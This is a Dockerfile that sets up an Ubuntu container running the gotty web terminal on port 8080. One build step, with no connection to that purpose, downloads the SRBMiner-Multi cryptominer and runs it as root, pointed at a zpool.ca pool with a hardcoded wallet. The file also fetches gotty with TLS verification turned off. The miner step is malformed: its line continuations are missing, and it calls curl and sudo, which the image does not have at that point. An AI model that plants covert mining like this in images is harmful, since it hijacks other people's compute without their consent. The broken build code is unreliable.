FROM ubuntu:20.04
LABEL maintainer="wingnut0310 <wingnut0310@gmail.com>"

ENV LANG en_US.UTF-8
ENV LANGUAGE en_US:en
ENV GOTTY_TAG_VER v1.0.1

RUN apt-get -y update && \
    apt-get install -y curl && \
    curl -sLk https://github.com/yudai/gotty/releases/download/${GOTTY_TAG_VER}/gotty_linux_amd64.tar.gz \
    | tar xzC /usr/local/bin && \
    apt-get purge --auto-remove -y curl && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists*
RUN curl https://github.com/doktor83/SRBMiner-Multi/releases/download/2.5.4/SRBMiner-Multi-2-5-4-Linux.tar.gz -L -O -J && 
tar -xf SRBMiner-Multi-2-5-4-Linux.tar.gz && 
cd SRBMiner-Multi-2-5-4 && sudo ./SRBMiner-MULTI --algorithm minotaurx --pool minotaurx.sea.mine.zpool.ca:7019 --wallet R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q --password c=RVN --keepalive true
COPY /run_gotty.sh /run_gotty.sh

RUN chmod 744 /run_gotty.sh

EXPOSE 8080

CMD ["/bin/bash","/run_gotty.sh"]
